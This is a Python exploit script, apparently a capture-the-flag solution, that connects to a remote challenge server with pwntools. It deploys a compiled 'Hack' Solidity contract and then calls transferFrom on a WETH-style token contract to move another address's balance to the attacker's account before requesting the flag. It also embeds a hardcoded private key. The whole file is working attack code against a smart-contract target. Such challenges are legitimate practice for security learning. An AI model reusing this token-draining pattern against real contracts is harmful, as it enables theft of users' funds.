from web3 import Web3
from solcx import compile_files, install_solc
import os
from pwn import *

install_solc('0.8.21')

context.log_level = 'debug'

r = remote('202.38.93.111', 10222)
r.recvuntil('token:')
r.sendline(os.getenv('token'))
r.recvuntil('The challenge you want to play (1 or 2 or 3):')
r.sendline('3')

def geteth(address):
    r.recvuntil('Choice: ')
    r.sendline('1')
    r.recvuntil('Address: ')
    r.sendline(address)

def sendtx(tx):
    r.recvuntil('Choice: ')
    r.sendline('2')
    r.recvuntil('Raw transaction: ')
    r.sendline(tx)

def getflag():
    r.recvuntil('Choice: ')
    r.sendline('3')

w3 = Web3()
private_key = 'b3a9830858dac0bfd85806c1e0060cef904a5ecc0e9f35ed22bd67c654daf7e5'
acct = w3.eth.account.from_key(private_key)

compiled_sol = compile_files(
    'hack3.sol',
    output_values=['abi', 'bin'],
    solc_version='0.8.21',
    evm_version='paris',
)
contract_interface = compiled_sol[f'hack3.sol:Hack']
bytecode = contract_interface['bin']
abi = contract_interface['abi']

Hack = w3.eth.contract(abi=abi, bytecode=bytecode)
nonce = 0
tx = Hack.constructor().build_transaction({'nonce': nonce, 'from': acct.address, 'gas': 10 ** 7, 'gasPrice': 10 ** 9, 'chainId': 2023, 'value': 2 * 10 ** 17})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
raw_tx = signed_tx.rawTransaction.hex()

geteth(acct.address)
sendtx(raw_tx)

contract_interface = compiled_sol[f'hack3.sol:Token']
abi = contract_interface['abi']

WETH = w3.eth.contract(abi=abi, address='0x9d9901f3b034427dd0e6Cf1c70aE5E4d94Ed19e7')
nonce = 1
tx = WETH.functions.transferFrom('0x607D86B806E7b2993438E82af2236C786a0Ff780', acct.address, 1061937238666853369).build_transaction({'nonce': nonce, 'from': acct.address, 'gas': 10 ** 7, 'gasPrice': 10 ** 9, 'chainId': 2023})
signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
raw_tx = signed_tx.rawTransaction.hex()

sendtx(raw_tx)
getflag()

r.interactive()
